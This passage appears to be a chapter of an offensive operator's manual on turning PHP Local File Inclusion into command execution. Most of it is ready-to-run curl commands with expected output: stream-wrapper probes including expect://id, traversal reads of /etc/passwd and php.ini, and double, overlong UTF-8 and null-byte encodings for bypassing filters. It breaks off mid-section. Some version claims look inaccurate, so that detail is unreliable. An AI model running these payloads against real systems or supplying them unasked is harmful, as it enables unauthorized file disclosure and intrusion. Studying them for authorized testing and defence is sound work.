## 1. Scope and Preconditions

This chapter covers the escalation from a confirmed Local File Inclusion primitive to arbitrary command execution. The operator should already have confirmed LFI via the procedures in Volume II, Chapter 4. Every technique in this chapter assumes the following baseline:

**Preconditions (all techniques):**

- A parameter that includes a file path server-side (e.g., `?page=`, `?file=`, `?template=`, `?lang=`, `?path=`)
- The application runs PHP on a Unix-like OS (Linux primary; BSD variants noted where behavior differs)
- The operator can reach the target over HTTP(S) and can send arbitrary headers (User-Agent, Cookie, Referer, X-Forwarded-For)

**Preconditions (per technique):**

| Technique | Additional Preconditions |
|-----------|-------------------------|
| PHP filter chains | PHP < 8.0 (iconv extension loaded); PHP version leak helpful but not required |
| Log poisoning | Writable/readable log file; ability to inject controlled content into a log entry; `allow_url_include` NOT required |
| Session poisoning | PHP sessions stored on disk (default `files` handler); ability to control a session value |
| /proc/self/environ | `/proc` mounted and readable by web server user; ability to inject into an environment variable (typically via User-Agent) |

## 2. Reconnaissance: Confirming the Inclusion Primitive

Before selecting an escalation path, the operator must determine what the inclusion function does with the input and what wrappers are honored.

### 2.1 Identify the Inclusion Function

Send a request with a known-good file and observe behavior:

```
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/page.php?file=about.php"
```

**Expected output:** `200`

Then test each wrapper individually. The response tells you which PHP stream wrappers are honored:

```
curl -s "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php"
```

**Expected output (success):** A base64 string in the response body. Decode it:

```
curl -s "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php" | grep -oP '(?<=<body>)[A-Za-z0-9+/=]+' | base64 -d
```

**Expected output:** The raw PHP source of `index.php`, including the inclusion logic.

**Failure indicator:** The literal string `php://filter/...` echoed back, or an empty response, or a 403. This means the wrapper is blocked or the input is being sanitized before reaching `include()`.

Test other wrappers:

```
curl -s "http://TARGET/page.php?file=data://text/plain,hello"
curl -s "http://TARGET/page.php?file=expect://id"
curl -s "http://TARGET/page.php?file=zip:///tmp/test.zip%23shell.php"
curl -s "http://TARGET/page.php?file=phar:///tmp/test.phar/shell.php"
```

Record which wrappers return content. The escalation path depends on this.

### 2.2 Determine the Base Path

If the inclusion is relative (no leading `/`), determine the working directory:

```
curl -s "http://TARGET/page.php?file=../../../../etc/passwd"
```

**Expected output:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

If this fails, try each encoding variant in Section 3 until one succeeds. The number of `../` needed depends on the depth of the include directory relative to `/`. Start with 8 and adjust.

**Failure indicator:** The application returns an error like `Warning: include(../../../../etc/passwd): failed to open stream`, or a blank page, or the application's default error handler. This means either the traversal depth is wrong or traversal is filtered.

### 2.3 Read Configuration to Confirm Exploitability

Once you can read files, pull the PHP configuration:

```
curl -s "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=/etc/php/7.4/apache2/php.ini" | base64 -d
```

Or if the path is unknown:

```
curl -s "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d
```

Key directives to extract:

```
curl -s "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | base64 -d | grep -E "^(allow_url_include|allow_url_fopen|session.save_path|disable_functions|open_basedir|extension\s*=\s*iconv)"
```

**Expected output (example):**
```
allow_url_include = Off
allow_url_fopen = On
session.save_path = "/var/lib/php/sessions"
disable_functions = 
open_basedir = 
extension=iconv
```

**What this tells you:**

- `allow_url_include = Off` → `data://` and direct RFI are unavailable; use LFI-to-RCE techniques in this chapter
- `session.save_path` → tells you where session files live for session poisoning
- `disable_functions` empty → `system()`, `exec()`, `shell_exec()`, `passthru()` all available once you achieve code execution
- `open_basedir` empty → no directory restriction on file access
- `extension=iconv` → PHP filter chains (Section 4) are viable

**Failure indicator:** If `open_basedir` is set, file reads outside the allowed paths will fail. If `disable_functions` includes all execution functions, you need a different post-exploitation path (e.g., `proc_open`, `pcntl_exec`, or writing a file directly).

## 3. Path Traversal Filter Bypass Encodings

When the application filters `../` or `/` in the input, the operator must encode or transform the traversal sequence. The following is the complete set of bypass encodings, ordered by likelihood of success against common filter implementations.

### 3.1 Single-Encoding Bypasses

**URL-encode the dots:**

```
%2e%2e%2f
```

```
curl -s "http://TARGET/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
```

**URL-encode the slash:**

```
..%2f
```

```
curl -s "http://TARGET/page.php?file=..%2f..%2f..%2fetc%2fpasswd"
```

**URL-encode both:**

```
%2e%2e%2f
```

```
curl -s "http://TARGET/page.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**Expected output for all:** The contents of `/etc/passwd`.

**Why this works:** The application's filter checks for the literal string `../` before URL-decoding. The web server or PHP runtime decodes the URL-encoded characters after the filter has already passed the input through.

**Failure indicator:** If the application URL-decodes before filtering, these will be caught. Move to double-encoding.

### 3.2 Double-Encoding

```
%252e%252e%252f
```

```
curl -s "http://TARGET/page.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
```

**Why this works:** The first decode pass (by the web server) turns `%252e` into `%2e`. The second decode pass (by PHP or the application) turns `%2e` into `.`. If the filter runs between the two decode passes, it sees `%2e%2e%2f` which does not match `../`.

**Expected output:** Contents of `/etc/passwd`.

**Failure indicator:** If the application only performs one decode pass, the file path will literally be `%2e%2e%2f...` which does not exist. You will see a `failed to open stream` error or blank response.

### 3.3 Overlong UTF-8 Encoding

```
%c0%ae%c0%ae%c0%af
```

```
curl -s "http://TARGET/page.php?file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd"
```

**Why this works:** Some URL decoders interpret overlong UTF-8 sequences. `%c0%ae` decodes to `.` in a permissive decoder. This is rare but works against older Java application servers and some PHP configurations with specific `mbstring` settings.

**Expected output:** Contents of `/etc/passwd`.

**Failure indicator:** Most modern PHP runtimes reject overlong UTF-8. You will see a `failed to open stream` error.

### 3.4 Null Byte Truncation (PHP < 5.3.4)

```
../../../../etc/passwd%00
```

```
curl -s "http://TARGET/page.php?file=../../../../etc/passwd%00"
```

**Why this works:** In PHP versions before 5.3.4, the null byte terminates the C string passed to the underlying file open call. If the application appends a suffix (e.g., `.php`), the null byte prevents the suffix from being included.

**Precondition:** PHP < 5.3.4. Check with:

```
curl -s "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/php/php.ini" | base64 -d | grep -i "php version"
```

Or read the PHP version from response headers:

```
curl -sI "http://TARGET/" | grep -i x-powered-by
```

**Expected output:** `X-Powered-By: PHP/5.2.17` (or similar < 5.3.4)

**Failure indicator:** On PHP >= 5.3.4, the null byte is rejected with a `TypeError` or the file simply fails to open. The response will be an error or blank.

### 3.5 Path Truncation (PHP < 5.3 / Apache < 2.0.59)

If the application appends a suffix and null bytes are unavailable:
